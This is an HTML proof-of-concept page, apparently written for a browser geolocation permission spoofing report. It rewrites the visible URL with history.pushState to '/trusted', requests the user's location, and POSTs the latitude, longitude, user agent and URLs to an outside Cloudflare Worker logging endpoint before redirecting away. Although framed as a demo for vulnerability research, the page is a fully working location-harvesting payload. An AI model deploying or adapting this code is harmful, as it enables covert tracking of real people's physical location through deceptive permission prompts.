<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Geolocation Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Request Location</h2>
  <p>Tap the button below to request Geolocation permission.</p>

  <button id="getLocationBtn">Get Location</button>
  <p id="output">Location: -</p>

  <div id="locationLink" style="display:none;">
    <p>Click the link below to see the location on Google Maps:</p>
    <a id="mapLink" target="_blank">View on Google Maps</a>
  </div>

  <div class="notice">
    Demo only — observe origin shown in permission dialog
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const getLocationBtn = document.getElementById('getLocationBtn');
const output = document.getElementById('output');
const locationLink = document.getElementById('locationLink');
const mapLink = document.getElementById('mapLink');

/* ✅ Cloudflare Worker endpoint */
const webhookUrl = 'https://geo-log.ecdnts.workers.dev';

/* 🔎 capture what the user SEES before permission */
let visibleContext = {
  origin_before: location.origin,
  href_before: location.href,
  ts_before: new Date().toISOString()
};

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';

  visibleContext = {
    origin_before: location.origin,
    href_before: location.href,
    ts_before: new Date().toISOString()
  };
};

getLocationBtn.onclick = () => {
  if (!navigator.geolocation) {
    output.textContent = 'Geolocation not supported.';
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      output.textContent = `Latitude: ${lat}, Longitude: ${lon}`;

      const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
      mapLink.href = googleMapsUrl;
      mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
      locationLink.style.display = 'block';

      // ✅ send log to Cloudflare Worker
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: 'geolocation_allowed',
          latitude: lat,
          longitude: lon,
          visible_origin: visibleContext.origin_before,
          visible_url: visibleContext.href_before,
          visible_timestamp: visibleContext.ts_before,
          actual_origin: location.origin,
          actual_url: location.href,
          permission_time: new Date().toISOString(),
          userAgent: navigator.userAgent
        })
      }).finally(() => {
        // redirect after sending log
        setTimeout(() => {
          location.href = 'https://google.com:9090';
        }, 100); // delay singkat supaya fetch sempat jalan
      });
    },
    err => {
      output.textContent = 'Permission denied or error.';
      console.error(err);
    }
  );
};
</script>

</body>
</html>
